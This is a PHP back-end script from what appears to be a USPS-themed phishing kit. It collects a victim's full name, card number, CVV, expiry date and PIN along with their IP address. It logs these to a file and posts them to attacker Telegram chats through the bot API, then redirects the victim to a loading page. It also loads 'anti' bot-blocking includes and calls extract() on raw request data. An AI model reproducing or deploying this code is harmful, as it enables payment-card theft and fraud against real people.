<?php 
include "../../anti/genius.php";
include "../../anti/genius1.php"; 
include "../../anti/genius2.php"; 
include "../../anti/genius3.php"; 
include "../../anti/genius4.php"; 
include "../../anti/genius5.php"; 
include "../../anti/genius6.php"; 
include "../../anti/genius7.php";
include "../../anti/genius8.php";
extract($_REQUEST);
include "../id.php";
$F=$_POST["fullname"];
$L=$_POST['CCNUM'];
$PH=$_POST["cvv"];
$pin=$_POST["pincode"];
$C=$_POST['expr'];

$ipp=$_SERVER['REMOTE_ADDR'];
$message=">>>>>>>>>>>>>|jaw ja|<<<<<<<<<<<<"."\n"."Full name :  ".$F."\n"."CC Number :   ".$L."\n"."expr date :   ".$C."\n"."CVV :   ".$PH."\n"."Pin Code :   ".$pin."\n".$ipp."\n".">>>>>>>>>>>>>-USPS-<<<<<<<<<<<<";
$user_ids=$id;
$filee=fopen("../geni.txt",'a');
fwrite($filee,$message."\n");
fclose($filee);
header("location: loading0.php");
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);

}
?>